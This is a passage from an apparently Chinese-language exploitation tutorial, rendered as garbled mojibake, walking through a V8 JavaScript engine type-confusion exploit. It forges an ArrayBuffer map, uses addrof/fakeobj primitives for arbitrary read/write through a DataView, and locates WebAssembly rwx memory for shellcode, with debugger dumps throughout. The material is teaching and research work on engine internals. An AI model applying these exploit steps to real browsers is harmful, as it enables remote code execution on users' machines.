class="number">0x00002aff905c0609</span></span><br><span class="line"><span class="number">0xda8501c2208</span>:<span class="number">0x000037f811f00189</span><span class="number">0x1b0004211d060307</span></span><br><span class="line"><span class="number">0xda8501c2218</span>:<span class="number">0x00000000182013ff</span><span class="number">0x0000207292942091</span></span><br><span class="line"><span class="number">0xda8501c2228</span>:<span class="number">0x00002072929420c9</span><span class="number">0x000020729294e9b9</span></span><br><span class="line"><span class="number">0xda8501c2238</span>:<span class="number">0x000020729294e9f1</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0xda8501c2248</span>:<span class="number">0x000037f811f002c1</span><span class="number">0x00002aff905c0609</span></span><br></pre></td></tr></table></figure></div><p>ä¹‹å‰è¯´è¿‡mapç»“æ„é‡Œç¬¬äºŒä¸ªintå€¼è¡¨ç¤ºtypeï¼Œå› æ­¤å¯ä»¥ç›´æ¥æŠŠ<code>0x1900042319080808</code> copyè¿‡æ¥ï¼Œå°±å¯ä»¥ä¼ªé€ ä¸€ä¸ªArrayBufferçš„mapäº†ï¼Œå…¶ä½™ç»“æ„å‚è€ƒä¸Šé¢jobçš„ç»“æœ</p><div class="highlight-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> fake_array_buffer_obj = [</span><br><span class="line"><span class="title function_">u2d</span>(<span class="number">0</span>), <span class="title function_">u2d</span>(<span class="number">0</span>), <span class="comment">//map*, properties ï¼ˆpropertiesåªè¦ä¸å»è®¿é—®ï¼Œè®¾ç½®æˆ0ä¹Ÿæ²¡äº‹ï¼‰</span></span><br><span class="line"><span class="title function_">u2d</span>(<span class="number">0</span>), <span class="title function_">u2d</span>(<span class="number">0x4000</span>), <span class="comment">//elements, length</span></span><br><span class="line"><span class="title function_">u2d</span>(<span class="number">0</span>), <span class="title function_">u2d</span>(<span class="number">2</span>), <span class="comment">//backing_store, embedder fields</span></span><br><span class="line"><span class="title function_">u2d</span>(<span class="number">0</span>), <span class="title function_">u2d</span>(<span class="number">0</span>), <span class="comment">//padding, padding</span></span><br><span class="line"><span class="title function_">u2d</span>(<span class="number">0</span>), <span class="title function_">u2d</span>(<span class="number">0x1900042319080808</span>), <span class="comment">//fake map</span></span><br><span class="line">];</span><br></pre></td></tr></table></figure></div><blockquote><p><code>u2d</code>æ˜¯å‰é¢å†™çš„å·¥å…·functionï¼Œunsigned int-&gt;double</p><p>è¿™é‡Œå¯ä»¥çœ‹åˆ°<code>map*</code>çš„ä½ç½®å†™çš„æ˜¯0ï¼Œè¿™ä¸ªæ˜¯å› ä¸ºæˆ‘ä»¬è¿˜ä¸çŸ¥é“æˆ‘ä»¬æ„é€ çš„fake mapçš„å…·ä½“åœ°å€ï¼Œç°åœ¨éœ€è¦æŠŠfake mapçš„address leakå‡ºæ¥ï¼Œç„¶åå¡«åˆ°<code>map*</code>çš„ä½ç½®</p></blockquote><p>é‚£ä¹ˆæ€ä¹ˆleakè¿™ä¸ªfake mapçš„addresså‘¢ğŸ¤”ï¼Œç”±äºå‰é¢æ„é€ åŸè¯­çš„ç« èŠ‚è¯´è¿‡ï¼Œå¯ä»¥åˆ©ç”¨ç±»å‹æ··æ·†æ¥leakå‡ºä»»æ„objectçš„addressï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥åœ¨è¿è¡Œpocçš„æ—¶å€™leakå‡ºæ„é€ çš„<code>fake_array_buffer_obj</code>çš„åœ°å€ï¼Œä¹‹ååªè¦åŠ ä¸Šæ„é€ çš„<code>fake map</code>ç›¸å¯¹äº<code>fake_array_buffer_obj</code>çš„åç§»å°±å¯ä»¥äº†ã€‚</p><p>é‚£ä¹ˆæ€ä¹ˆè·å¾—è¿™ä¸ªåç§»ğŸ¤”å…¶å®æˆ‘ä»¬æ„é€ çš„<code>fake_array_buffer_obj</code>å®è´¨ä¸Šæ˜¯ä¸€ä¸ªJSArrayï¼Œå›é¡¾ä¸€ä¸‹ä¹‹å‰è¯´çš„JSArrayçš„ç»“æ„ï¼Œåé¢å­˜å‚¨çš„å…ƒç´ å…¶å®æ˜¯åœ¨FixedArrayçš„Elementsä¸­ï¼Œè€ŒElementsç›¸å¯¹äºJSArrayå¤´çš„åç§»å…¶å®æ˜¯**<u>å›ºå®š</u>**çš„</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">graph TD</span><br><span class="line">    A[&quot;Pointer (63 bit) | 1&quot;] --&gt; B[JSArray]</span><br><span class="line">    B --&gt; C[Map*]</span><br><span class="line">    B --&gt; D[Properties*]</span><br><span class="line">    B --&gt; E[Elements*]</span><br><span class="line">    B --&gt; F[Length]</span><br><span class="line">    E --&gt; G[FixedArray]</span><br><span class="line">    G --&gt; H[Map*]</span><br><span class="line">    G --&gt; I[Length]</span><br><span class="line">    G --&gt; J[&quot;Elements[0]&quot;]</span><br><span class="line">    G --&gt; K[&quot;Elements[1]&quot;]</span><br><span class="line">    G --&gt; M[&quot;....&quot;]</span><br><span class="line"></span><br></pre></td></tr></table></figure></div><h3 id="è®¡ç®—fake-mapåç§»"><a href="#è®¡ç®—fake-mapåç§»" class="headerlink" title="è®¡ç®—fake mapåç§»"></a>è®¡ç®—fake mapåç§»</h3><p>é¦–å…ˆçœ‹ä¸€ä¸‹æ„é€ çš„fakeobj</p><div class="highlight-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> fake_array_buffer_obj = [</span><br><span class="line"><span class="title function_">u2d</span>(<span class="number">0</span>), <span class="title function_">u2d</span>(<span class="number">0</span>), <span class="comment">//map*, properties ï¼ˆpropertiesåªè¦ä¸å»è®¿é—®ï¼Œè®¾ç½®æˆ0ä¹Ÿæ²¡äº‹ï¼‰</span></span><br><span class="line"><span class="title function_">u2d</span>(<span class="number">0</span>), <span class="title function_">u2d</span>(<span class="number">0x4000</span>), <span class="comment">//elements, length</span></span><br><span class="line"><span class="title function_">u2d</span>(<span class="number">0</span>), <span class="title function_">u2d</span>(<span class="number">2</span>), <span class="comment">//backing_store, embedder fields</span></span><br><span class="line"><span class="title function_">u2d</span>(<span class="number">0</span>), <span class="title function_">u2d</span>(<span class="number">0</span>), <span class="comment">//padding, padding</span></span><br><span class="line"><span class="title function_">u2d</span>(<span class="number">0</span>), <span class="title function_">u2d</span>(<span class="number">0x1900042319080808</span>), <span class="comment">//fake map</span></span><br><span class="line">];</span><br><span class="line">%<span class="title class_">DebugPrint</span>(fake_array_buffer_obj);</span><br><span class="line">%<span class="title class_">SystemBreak</span>();</span><br><span class="line"><span class="comment">//output</span></span><br><span class="line"><span class="number">0x033dc42cad71</span> &lt;<span class="title class_">JSArray</span>[<span class="number">10</span>]&gt;</span><br><span class="line">pwndbg&gt; job <span class="number">0x033dc42cad71</span> <span class="comment">//çœ‹çœ‹JSArray</span></span><br><span class="line"><span class="number">0x33dc42cad71</span>: [<span class="title class_">JSArray</span>] <span class="keyword">in</span> <span class="title class_">OldSpace</span></span><br><span class="line"> - <span class="attr">map</span>: <span class="number">0x357201fc2ed9</span> &lt;<span class="title class_">Map</span>(<span class="variable constant_">PACKED_DOUBLE_ELEMENTS</span>)&gt; [<span class="title class_">FastProperties</span>]</span><br><span class="line"> - <span class="attr">prototype</span>: <span class="number">0x34e472dd1111</span> &lt;<span class="title class_">JSArray</span>[<span class="number">0</span>]&gt;</span><br><span class="line"> - <span class="attr">elements</span>: <span class="number">0x033dc42cada9</span> &lt;<span class="title class_">FixedDoubleArray</span>[<span class="number">10</span>]&gt; [<span class="variable constant_">PACKED_DOUBLE_ELEMENTS</span>]</span><br><span class="line"> - <span class="attr">length</span>: <span class="number">10</span></span><br><span class="line"> - <span class="attr">properties</span>: <span class="number">0x2c40d2940c71</span> &lt;<span class="title class_">FixedArray</span>[<span class="number">0</span>]&gt; &#123;</span><br><span class="line">    #<span class="attr">length</span>: <span class="number">0x1aa9ac5c01a9</span> &lt;<span class="title class_">AccessorInfo</span>&gt; (<span class="keyword">const</span> accessor descriptor)</span><br><span class="line"> &#125;</span><br><span class="line"> - <span class="attr">elements</span>: <span class="number">0x033dc42cada9</span> &lt;<span class="title class_">FixedDoubleArray</span>[<span class="number">10</span>]&gt; &#123;</span><br><span class="line">         <span class="number">0</span>-<span class="number">2</span>: <span class="number">0</span></span><br><span class="line">           <span class="number">3</span>: <span class="number">8.09477e-320</span></span><br><span class="line">           <span class="number">4</span>: <span class="number">0</span></span><br><span class="line">           <span class="number">5</span>: <span class="number">9.88131e-324</span></span><br><span class="line">         <span class="number">6</span>-<span class="number">8</span>: <span class="number">0</span></span><br><span class="line">           <span class="number">9</span>: <span class="number">2.87575e-188</span></span><br><span class="line"> &#125;</span><br><span class="line">pwndbg&gt; x/20gx <span class="number">0x033dc42cada9</span>-<span class="number">1</span> <span class="comment">//çœ‹çœ‹elements</span></span><br><span class="line"><span class="number">0x33dc42cada8</span>:<span class="number">0x00002c40d29414f9</span>(map*)<span class="number">0x0000000a00000000</span>(length)</span><br><span class="line"><span class="number">0x33dc42cadb8</span>:<span class="number">0x0000000000000000</span>(<span class="title class_">Elements</span>[<span class="number">0</span>])<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x33dc42cadc8</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000004000</span></span><br><span class="line"><span class="number">0x33dc42cadd8</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000002</span></span><br><span class="line"><span class="number">0x33dc42cade8</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x33dc42cadf8</span>:<span class="number">0x0000000000000000</span><span class="number">0x1900042319080800</span>(fake mapğŸŒŸ)</span><br><span class="line"><span class="number">0x33dc42cae08</span>:<span class="number">0x00002c40d2940139</span><span class="number">0x000351f800000000</span></span><br><span class="line"><span class="number">0x33dc42cae18</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x33dc42cae28</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x33dc42cae38</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line">pwndbg&gt; p/x <span class="number">0x33dc42cadb8</span>-<span class="number">0x33dc42cad70</span></span><br><span class="line">$2 = <span class="number">0x48</span></span><br></pre></td></tr></table></figure></div><blockquote><p>å¯ä»¥çœ‹åˆ°Elementsç›¸å¯¹äºJSArrayå¤´çš„åç§»æ˜¯0x48ï¼Œæ‰€ä»¥å†åŠ ä¸Šfake mapç›¸å¯¹äºElementsçš„åç§»(4x16&#x3D;64)å°±å¾—åˆ°äº†fake mapç›¸å¯¹äºJSArrayçš„åç§»\</p></blockquote><p>è¿™æ ·å°±å¯ä»¥æ„é€ ä¸€ä¸ªArrayBufferäº†</p><div class="highlight-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> fake_array_buffer_obj = [</span><br><span class="line"><span class="title function_">u2d</span>(<span class="number">0</span>), <span class="title function_">u2d</span>(<span class="number">0</span>), <span class="comment">//map*, properties ï¼ˆpropertiesåªè¦ä¸å»è®¿é—®ï¼Œè®¾ç½®æˆ0ä¹Ÿæ²¡äº‹ï¼‰</span></span><br><span class="line"><span class="title function_">u2d</span>(<span class="number">0</span>), <span class="title function_">u2d</span>(<span class="number">0x4000</span>), <span class="comment">//elements, length</span></span><br><span class="line"><span class="title function_">u2d</span>(<span class="number">0</span>), <span class="title function_">u2d</span>(<span class="number">2</span>), <span class="comment">//backing_store, embedder fields</span></span><br><span class="line"><span class="title function_">u2d</span>(<span class="number">0</span>), <span class="title function_">u2d</span>(<span class="number">0</span>), <span class="comment">//padding, padding</span></span><br><span class="line"><span class="title function_">u2d</span>(<span class="number">0</span>), <span class="title function_">u2d</span>(<span class="number">0x1900042319080808</span>), <span class="comment">//fake map è¿™æ­¥å¾ˆå…³é”®ï¼Œå¦‚æœæ²¡æ”¹å¯¹mapã€‚åç»­åˆ©ç”¨fakeobjè¿”å›çš„objectç±»å‹å°±ä¸ä¼šæ˜¯ArrayBuffer</span></span><br><span class="line">];</span><br><span class="line"><span class="keyword">let</span> fake_obj_elements_addr = <span class="title function_">addrof</span>(fake_array_buffer_obj) + <span class="number">0x48</span>;</span><br><span class="line"><span class="title function_">print</span>(<span class="string">&quot;fake obj elements addr is:&quot;</span>+<span class="title function_">hex</span>(fake_obj_elements_addr));</span><br><span class="line"><span class="keyword">let</span> array_buffer_obj_map_addr = fake_obj_elements_addr + <span class="number">64</span>;</span><br><span class="line"><span class="title function_">print</span>(<span class="string">&quot;fake array buffer&#x27;s map addr is:&quot;</span>+<span class="title function_">hex</span>( array_buffer_obj_map_addr));</span><br><span class="line">fake_array_buffer_obj[<span class="number">0</span>]=<span class="title function_">u2d</span>(array_buffer_obj_map_addr);<span class="comment">//fake mapçš„åœ°å€æ›¿æ¢</span></span><br><span class="line"><span class="keyword">let</span> fake_array_buffer = <span class="title function_">fakeobj</span>(<span class="title function_">u2d</span>(fake_obj_elements_addr));<span class="comment">//fake objä¼šåˆ©ç”¨ç±»å‹æ··æ·†ï¼ŒæŠŠä¼ å…¥çš„åœ°å€å½“ä½œHeapObject Pointerè§£æ</span></span><br><span class="line"><span class="keyword">let</span> dv = <span class="keyword">new</span> <span class="title class_">DataView</span>(fake_array_buffer); <span class="comment">//åˆ©ç”¨ArrayBufferåˆ›å»ºä¸€ä¸ªDataViewå®ç°ä»»æ„åœ°å€è¯»å†™</span></span><br></pre></td></tr></table></figure></div><blockquote><p>å¯ä»¥æŠŠDataVeiwç†è§£æˆæ˜¯ç”¨æ¥è¯»å†™ä¼ å…¥çš„ArrayBufferçš„backing storeä¸­çš„å€¼çš„ï¼Œè€Œæˆ‘ä»¬å†æ„é€ ArrayBufferæ—¶ï¼ŒæŠŠbacking storeçš„é•¿åº¦è¢«æˆ‘ä»¬æ”¹å¾—å¾ˆå¤§(0x4000)ï¼Œæ‰€ä»¥å¯ä»¥å®ç°ä»»æ„åœ°å€è¯»å†™</p></blockquote><h3 id="wasmå†™shellcode"><a href="#wasmå†™shellcode" class="headerlink" title="wasmå†™shellcode"></a>wasmå†™shellcode</h3><p>web assemblyåˆ›å»ºçš„Instanceé™„è¿‘æœ‰ä¸€å—æƒé™ä¸ºrwxçš„å†…å­˜ï¼Œå¯ä»¥å†™å…¥shellcodeï¼Œè¿™å—å†…å­˜ç›¸å¯¹äºInstanceçš„åç§»ä¹Ÿæ˜¯å›ºå®šçš„ï¼Œç°åœ¨æˆ‘ä»¬æ¥æ‰¾ä¸€ä¸‹è¿™ä¸ªåç§»</p><div class="highlight-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> wasm_code = <span class="keyword">new</span> <span class="title class_">Uint8Array</span>([<span class="number">0</span>, <span class="number">97</span>, <span class="number">115</span>, <span class="number">109</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">133</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">96</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">127</span>, <span class="number">3</span>, <span class="number">130</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>,<span class="number">1</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">132</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">112</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">131</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">129</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">145</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">6</span>, <span class="number">109</span>, <span class="number">101</span>, <span class="number">109</span>, <span class="number">111</span>, <span class="number">114</span>, <span class="number">121</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">109</span>, <span class="number">97</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">138</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">132</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">0</span>,<span class="number">65</span>, <span class="number">42</span>, <span class="number">11</span>]); <span class="comment">//ä¸€ä¸ªç®€å•çš„mainå‡½æ•°</span></span><br><span class="line"><span class="keyword">var</span> wasm_mod = <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Module</span>(wasm_code);<span class="comment">//åˆ›å»ºæ¨¡å—</span></span><br><span class="line"><span class="keyword">var</span> wasm_instance = <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Instance</span>(wasm_mod);<span class="comment">//å®ä¾‹åŒ–</span></span><br><span class="line"><span class="keyword">var</span> f = wasm_instance.<span class="property">exports</span>.<span class="property">main</span>;<span class="comment">//è·å¾—å¯¼å‡ºå‡½æ•°</span></span><br><span class="line">%<span class="title class_">DebugPrint</span>(wasm_instance);</span><br><span class="line">%<span class="title class_">SystemBreak</span>();</span><br><span class="line"><span class="comment">//output</span></span><br><span class="line"><span class="number">0x17f0cf121831</span> &lt;<span class="title class_">Instance</span> map = <span class="number">0x1ac3290c9789</span>&gt;</span><br><span class="line">pwndbg&gt; job <span class="number">0x17f0cf121831</span></span><br><span class="line"><span class="number">0x17f0cf121831</span>: [<span class="title class_">WasmInstanceObject</span>] <span class="keyword">in</span> <span class="title class_">OldSpace</span></span><br><span class="line"> - <span class="attr">map</span>: <span class="number">0x1ac3290c9789</span> &lt;<span class="title class_">Map</span>(<span class="variable constant_">HOLEY_ELEMENTS</span>)&gt; [<span class="title class_">FastProperties</span>]</span><br><span class="line"> - <span class="attr">prototype</span>: <span class="number">0x19ccc870a379</span> &lt;<span class="title class_">Object</span> map = <span class="number">0x1ac3290cabd9</span>&gt;</span><br><span class="line"> - <span class="attr">elements</span>: <span class="number">0x03ea86480c71</span> &lt;<span class="title class_">FixedArray</span>[<span class="number">0</span>]&gt; [<span class="variable constant_">HOLEY_ELEMENTS</span>]</span><br><span class="line"> - <span class="attr">module_object</span>: <span class="number">0x148cb2f00d31</span> &lt;<span class="title class_">Module</span> map = <span class="number">0x1ac3290c91e9</span>&gt;</span><br><span class="line"> - <span class="attr">exports_object</span>: <span class="number">0x148cb2f00f69</span> &lt;<span class="title class_">Object</span> map = <span class="number">0x1ac3290cad19</span>&gt;</span><br><span class="line"> - <span class="attr">native_context</span>: <span class="number">0x17f0cf101869</span> &lt;<span class="title class_">NativeContext</span>[<span class="number">246</span>]&gt;</span><br><span class="line"> - <span class="attr">memory_object</span>: <span class="number">0x17f0cf121959</span> &lt;<span class="title class_">Memory</span> map = <span class="number">0x1ac3290ca189</span>&gt;</span><br><span class="line"> - table <span class="number">0</span>: <span class="number">0x148cb2f00f01</span> &lt;<span class="title class_">Table</span> map = <span class="number">0x1ac3290c9aa9</span>&gt;</span><br><span class="line"> - <span class="attr">imported_function_refs</span>: <span class="number">0x03ea86480c71</span> &lt;<span class="title class_">FixedArray</span>[<span class="number">0</span>]&gt;</span><br><span class="line"> - <span class="attr">managed_native_allocations</span>: <span class="number">0x148cb2f00ea9</span> &lt;<span class="title class_">Foreign</span>&gt;</span><br><span class="line"> - <span class="attr">memory_start</span>: <span class="number">0x7f1504000000</span></span><br><span class="line"> - <span class="attr">memory_size</span>: <span class="number">65536</span></span><br><span class="line"> - <span class="attr">memory_mask</span>: ffff</span><br><span class="line"> - <span class="attr">imported_function_targets</span>: <span class="number">0x55b83d59f480</span></span><br><span class="line"> - <span class="attr">globals_start</span>: (nil)</span><br><span class="line"> - <span class="attr">imported_mutable_globals</span>: <span class="number">0x55b83d59eaf0</span></span><br><span class="line"> - <span class="attr">indirect_function_table_size</span>: <span class="number">0</span></span><br><span class="line"> - <span class="attr">indirect_function_table_sig_ids</span>: (nil)</span><br><span class="line"> - <span class="attr">indirect_function_table_targets</span>: (nil)</span><br><span class="line"> - <span class="attr">properties</span>: <span class="number">0x03ea86480c71</span> &lt;<span class="title class_">FixedArray</span>[<span class="number">0</span>]&gt; &#123;&#125;</span><br><span class="line">pwndbg&gt; x/80gx <span class="number">0x17f0cf121831</span>-<span class="number">1</span></span><br><span class="line"><span class="number">0x17f0cf121830</span>:<span class="number">0x00001ac3290c9789</span><span class="number">0x000003ea86480c71</span></span><br><span class="line"><span class="number">0x17f0cf121840</span>:<span class="number">0x000003ea86480c71</span><span class="number">0x00007f1504000000</span></span><br><span class="line"><span class="number">0x17f0cf121850</span>:<span class="number">0x0000000000010000</span><span class="number">0x000000000000ffff</span></span><br><span class="line"><span class="number">0x17f0cf121860</span>:<span class="number">0x000055b83d5157f8</span><span class="number">0x000003ea86480c71</span></span><br><span class="line"><span class="number">0x17f0cf121870</span>:<span class="number">0x000055b83d59f480</span><span class="number">0x000003ea864804d1</span></span><br><span class="line"><span class="number">0x17f0cf121880</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x17f0cf121890</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x17f0cf1218a0</span>:<span class="number">0x000055b83d59eaf0</span><span class="number">0x000003ea864804d1</span></span><br><span class="line"><span class="number">0x17f0cf1218b0</span>:<span class="number">0x000055b83d50bb30</span><span class="number">0x00001436a173c000</span> ğŸŒŸ</span><br><span class="line">......</span><br><span class="line">pwndbg&gt; vmmap</span><br><span class="line"><span class="attr">LEGEND</span>: <span class="variable constant_">STACK</span> | <span class="variable constant_">HEAP</span> | <span class="variable constant_">CODE</span> | <span class="variable constant_">DATA</span> | <span class="variable constant_">WX</span> | <span class="variable constant_">RODATA</span></span><br><span class="line">             <span class="title class_">Start</span>                <span class="title class_">End</span> <span class="title class_">Perm</span>     <span class="title class_">Size</span> <span class="title class_">Offset</span> <span class="title class_">File</span></span><br><span class="line">     <span class="number">0x10eb3a00000</span>      <span class="number">0x10eb4201000</span> rw-p   <span class="number">801000</span>      <span class="number">0</span> [anon_10eb3a00]</span><br><span class="line">     <span class="number">0x3ea86480000</span>      <span class="number">0x3ea864c0000</span> r--p    <span class="number">40000</span>      <span class="number">0</span> [anon_3ea86480]</span><br><span class="line">     <span class="number">0xf3b02f00000</span>      <span class="number">0xf3b02f40000</span> ---p    <span class="number">40000</span>      <span class="number">0</span> [anon_f3b02f00]</span><br><span class="line">    <span class="number">0x1436a173c000</span>     <span class="number">0x1436a173d000</span> rwxp     <span class="number">1000</span>      <span class="number">0</span> [anon_1436a173c] ğŸŒŸ</span><br><span class="line">...</span><br><span class="line">pwndbg&gt; vmmap <span class="number">0x00001436a173c000</span></span><br><span class="line"><span class="attr">LEGEND</span>: <span class="variable constant_">STACK</span> | <span class="variable constant_">HEAP</span> | <span class="variable constant_">CODE</span> | <span class="variable constant_">DATA</span> | <span class="variable constant_">WX</span> | <span class="variable constant_">RODATA</span></span><br><span class="line">             <span class="title class_">Start</span>                <span class="title class_">End</span> <span class="title class_">Perm</span>     <span class="title class_">Size</span> <span class="title class_">Offset</span> <span class="title class_">File</span></span><br><span class="line">     <span class="number">0xf3b02f00000</span>      <span class="number">0xf3b02f40000</span> ---p    <span class="number">40000</span>      <span class="number">0</span> [anon_f3b02f00]</span><br><span class="line">â–º   <span class="number">0x1436a173c000</span>     <span class="number">0x1436a173d000</span> rwxp     <span class="number">1000</span>      <span class="number">0</span> [anon_1436a173c] +<span class="number">0x0</span></span><br><span class="line">    <span class="number">0x1436a173d000</span>     <span class="number">0x1436e173c000</span> ---p 3ffff000      <span class="number">0</span> [anon_1436a173d]</span><br><span class="line">pwndbg&gt; p/x <span class="number">0x17f0cf1218b8</span>-(<span class="number">0x17f0cf121831</span>-<span class="number">1</span>) <span class="comment">//rwxå†…å­˜ç›¸å¯¹äºInstanceçš„åç§»</span></span><br><span class="line">$3 = <span class="number">0x88</span></span><br></pre></td></tr></table></figure></div><blockquote><p>è¿™æ ·å°±å¯ä»¥å¾—åˆ°åç§»æ˜¯0x88äº†</p></blockquote><p>æ¥ä¸‹æ¥å°±éœ€è¦åˆ©ç”¨ä¹‹å‰æ„é€ çš„DataViewæ¥ä»»æ„åœ°å€è¯»å†™äº†ï¼Œéœ€è¦å®ç°ä¸€äº›å·¥å…·function</p><div class="highlight-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">get_32</span>(<span class="params">addr</span>) &#123;</span><br><span class="line">    fake_ab_obj[<span class="number">4</span>] = <span class="title function_">u2d</span>(addr);</span><br><span class="line">    <span class="keyword">return</span> dv.<span class="title function_">getUint32</span>(<span class="number">0</span>, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">get_64</span>(<span class="params">addr</span>) &#123;</span><br><span class="line">    fake_ab_obj[<span class="number">4</span>] = <span class="title function_">u2d</span>(addr);<span class="comment">//æŠŠbacking store*æ”¹æˆè¦è¯»å–çš„åœ°å€</span></span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">d2u</span>(dv.<span class="title function_">getFloat64</span>(<span class="number">0</span>, <span class="literal">true</span>));<span class="comment">//getFloat64å‡½æ•°å¯ä»¥è·å¾—backing 